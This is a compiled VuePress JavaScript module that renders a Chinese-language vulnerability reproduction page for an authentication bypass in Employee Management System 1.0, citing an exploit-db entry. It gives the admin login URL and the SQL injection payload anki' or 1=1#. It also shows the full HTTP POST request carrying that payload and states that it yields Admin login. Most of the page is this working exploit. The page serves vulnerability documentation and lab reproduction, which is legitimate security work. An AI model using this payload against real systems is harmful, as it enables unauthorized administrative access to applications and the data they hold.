import{_ as a}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as l,c as o,a as e,b as n,d as t,e as d}from"./app-58e4a7d6.js";const r={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),m=e("p",null,"漏洞发现时间：2020-10-16",-1),p={href:"https://www.sourcecodester.com/sites/default/files/download/razormist/employee-management-system.zip",target:"_blank",rel:"noopener noreferrer"},u=e("p",null,"验证环境：Windows 10 + xampp v3.2.4",-1),v=e("p",null,"参考链接：",-1),_={href:"https://www.exploit-db.com/exploits/48882",target:"_blank",rel:"noopener noreferrer"},h=d(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>打开网址：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://localhost:8081/Employee%20Management%20System/alogin.html
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>通过payload绕过验证：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>anki&#39; or 1=1#
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>发送请求：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /Employee%20Management%20System/process/aprocess.php HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 70
Origin: http://localhost:8081
Connection: close
Referer: http://localhost:8081/Employee%20Management%20System/alogin.html
Cookie: PHPSESSID=infdfigld4et4jndfgbn33kcsv
Upgrade-Insecure-Requests: 1

mailuid=anki%27+or+1%3D1%23&amp;pwd=anki%27+or+1%3D1%23&amp;login-submit=Login
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>将以Admin身份登录应用</p>`,8);function g(b,x){const i=s("ExternalLinkIcon");return l(),o("div",null,[c,m,e("p",null,[n("软件下载地址："),e("a",p,[n("https://www.sourcecodester.com/sites/default/files/download/razormist/employee-management-system.zip"),t(i)])]),u,v,e("ul",null,[e("li",null,[e("a",_,[n("https://www.exploit-db.com/exploits/48882"),t(i)])])]),h])}const y=a(r,[["render",g],["__file","员工管理系统 Employee Management System 1.0 身份验证绕过.html.vue"]]);export{y as default};
